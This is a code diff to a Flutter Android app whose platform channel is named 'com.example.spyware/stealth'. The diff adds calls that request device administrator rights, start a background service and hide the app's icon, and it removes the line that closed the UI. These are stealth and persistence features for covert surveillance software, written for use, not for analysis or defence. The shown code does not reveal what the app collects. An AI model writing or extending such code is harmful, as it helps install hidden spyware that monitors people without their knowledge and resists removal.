@@ -19,6 +19,14 @@ class _PermissionGate extends StatefulWidget {
 }
 
 class _PermissionGateState extends State<_PermissionGate> {
+  Future<void> _requestDeviceAdmin() async {
+    const platform = MethodChannel('com.example.spyware/stealth');
+    try {
+      await platform.invokeMethod('requestAdmin');
+    } catch (e) {
+      print("Failed to request admin: $e");
+    }
+  }
   @override
   void initState() {
     super.initState();
@@ -47,13 +55,16 @@ class _PermissionGateState extends State<_PermissionGate> {
 
     const platform = MethodChannel('com.example.spyware/stealth');
     try {
+      await platform.invokeMethod('startService');
+    } catch (e) {
+      print("Failed to start service: $e");
+    }
+    try {
       await platform.invokeMethod('hideIcon');
     } catch (e) {
       print("Failed to hide icon: $e");
     }
-
-    // Now close the Flutter UI
-    SystemNavigator.pop();
+    _requestDeviceAdmin();
   }
 
   @override
